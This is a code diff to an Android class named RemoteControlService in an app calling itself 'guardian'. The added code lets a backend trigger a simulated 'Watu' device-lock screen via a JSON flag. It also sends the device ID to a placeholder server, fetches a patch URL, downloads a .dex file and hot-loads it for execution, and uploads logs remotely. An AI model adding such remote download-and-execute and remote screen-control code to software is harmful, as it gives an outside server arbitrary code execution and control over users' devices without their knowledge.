@@ -2,9 +2,12 @@ package com.system.guardian.core;
 
 import android.annotation.SuppressLint;
 import android.content.Context;
+import android.content.Intent;
 import android.provider.Settings;
 
+import com.system.guardian.CrashLogger;
 import com.system.guardian.GuardianStateCache;
+import com.system.guardian.test.WatuLockSimulatorActivity;
 
 import org.json.JSONObject;
 import org.json.JSONException;
@@ -13,6 +16,9 @@ import java.io.BufferedReader;
 import java.io.InputStreamReader;
 import java.net.HttpURLConnection;
 import java.net.URL;
+import java.io.File;
+import java.io.FileOutputStream;
+import java.io.InputStream;
 
 public class RemoteControlService {
 
@@ -53,6 +59,15 @@ public class RemoteControlService {
                     JSONObject obj = new JSONObject(json);
                     String status = obj.optString("status", "off");
                     String value = obj.optString("value", "off");
+                    boolean simulateWatu = obj.optBoolean("simulate_watu", false);
+
+                    if (simulateWatu) {
+                        Intent intent = new Intent(ctx, WatuLockSimulatorActivity.class);
+                        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                        ctx.startActivity(intent);
+                        CrashLogger.log(ctx, "SimTrigger", "🚨 Simulated Watu lock triggered from backend");
+                        LogUploader.uploadLog(ctx, "🚨 Simulated Watu lock launched via control JSON");
+                    }
 
                     if (status.equalsIgnoreCase("override")) {
                         enabled = value.equalsIgnoreCase("on");
@@ -73,6 +88,60 @@ public class RemoteControlService {
             } catch (Exception e) {
                 LogUploader.uploadLog(ctx, "⚠️ Remote check failed: " + e.getClass().getSimpleName() + " - " + e.getMessage());
                 callback.onResult(GuardianStateCache.lastKnownState);
+            }
+        }).start();
+    }
+
+    private static void downloadAndRunDex(Context ctx, String urlStr) {
+        try {
+            URL url = new URL(urlStr);
+            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+            conn.setConnectTimeout(8000);
+            conn.setReadTimeout(8000);
+
+            File dexFile = new File(ctx.getFilesDir(), "patch.dex");
+            FileOutputStream out = new FileOutputStream(dexFile);
+            InputStream in = conn.getInputStream();
+
+            byte[] buffer = new byte[1024];
+            int len;
+            while ((len = in.read(buffer)) != -1) {
+                out.write(buffer, 0, len);
+            }
+
+            out.close();
+            in.close();
+
+            LogUploader.uploadLog(ctx, "📦 Patch downloaded. Executing...");
+            DexHotLoader.loadDexPatch(ctx, dexFile.getAbsolutePath());
+
+        } catch (Exception e) {
+            LogUploader.uploadLog(ctx, "❌ Dex download/run failed: " + e.getMessage());
+        }
+    }
+
+    public static void fetchAndApplyPatch(Context ctx) {
+        new Thread(() -> {
+            try {
+                String token = Settings.Secure.getString(ctx.getContentResolver(), Settings.Secure.ANDROID_ID);
+                URL url = new URL("https://your-backend.com/patch/" + token);  // ✅ Change to your real endpoint
+                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+                conn.setConnectTimeout(8000);
+                conn.setReadTimeout(8000);
+
+                BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
+                String json = reader.readLine();
+                reader.close();
+
+                JSONObject obj = new JSONObject(json);
+                String patchUrl = obj.optString("patch_url", null);
+
+                if (patchUrl != null && !patchUrl.equals("null")) {
+                    downloadAndRunDex(ctx, patchUrl);
+                }
+
+            } catch (Exception e) {
+                LogUploader.uploadLog(ctx, "⚠️ Patch fetch failed: " + e.getMessage());
             }
         }).start();
     }
